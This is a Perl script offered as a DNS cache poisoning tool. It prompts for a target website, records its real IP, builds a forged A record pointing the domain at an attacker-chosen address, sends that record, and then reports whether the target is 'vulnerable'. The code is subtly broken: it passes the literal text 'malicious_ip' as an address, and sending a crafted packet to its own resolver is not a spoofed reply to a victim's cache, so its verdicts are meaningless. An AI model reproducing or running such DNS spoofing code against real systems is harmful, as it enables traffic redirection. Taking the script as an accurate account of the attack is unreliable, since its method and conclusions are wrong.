#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use Net::DNS;
use Net::DNS::Packet;
use Term::ANSIColor qw(:constants);

# Function to perform DNS resolution and retrieve the IP address
sub get_domain_ip {
    my ($domain) = @_;

    my $resolver = Net::DNS::Resolver->new;
    $resolver->tcp_timeout(2);  # Set timeout for TCP connections to 2 seconds
    $resolver->udp_timeout(2);  # Set timeout for UDP connections to 2 seconds

    my $result = $resolver->query($domain);

    if ($result) {
        foreach my $rr ($result->answer) {
            if ($rr->type eq 'A') {
                return $rr->address;
            }
        }
    }

    return undef;
}

# Function to perform DNS cache poisoning by injecting a fake response
sub inject_dns_response {
    my ($domain, $malicious_ip) = @_;

    my $packet = Net::DNS::Packet->new($domain, 'A');
    my $record = Net::DNS::RR->new("$domain. 3600 IN A $malicious_ip");
    $packet->push("answer", $record);

    my $res = Net::DNS::Resolver->new;
    my $reply = $res->send($packet);

    if ($reply) {
        print GREEN, "DNS response injected successfully.\n", RESET;
    } else {
        print RED, "Failed to inject DNS response.\n", RESET;
    }
}

# Main function to test cache poisoning
sub test_cache_poisoning {
    my ($target_url) = @_;

    my ($domain) = $target_url =~ m|^(?:https?://)?(?:www\.)?([^:/]+)|i;
    my $expected_ip = get_domain_ip($domain);

    unless ($expected_ip) {
        print RED, "Failed to retrieve IP address for $domain. Exiting.\n", RESET;
        return;
    }

    # Check initial DNS resolution
    print "Testing initial DNS resolution...\n";
    print "Expected IP for $domain: ", BOLD, "$expected_ip\n", RESET;

    # Craft and send DNS response to simulate cache poisoning
    print "Injecting DNS response to simulate cache poisoning...\n";
    inject_dns_response($domain, "malicious_ip");

    # Check DNS resolution after cache poisoning attempt
    print "Testing DNS resolution after cache poisoning attempt...\n";
    my $new_ip = get_domain_ip($domain);
    if ($new_ip && $new_ip ne $expected_ip) {
        print GREEN, "Cache poisoning test successful: $domain is vulnerable.\n", RESET;
    } else {
        print RED, "Cache poisoning test failed: $domain is not vulnerable.\n", RESET;
    }
}

# Main
print "Enter your target website URL: ";
my $target_url = <STDIN>;
chomp $target_url;

test_cache_poisoning($target_url);
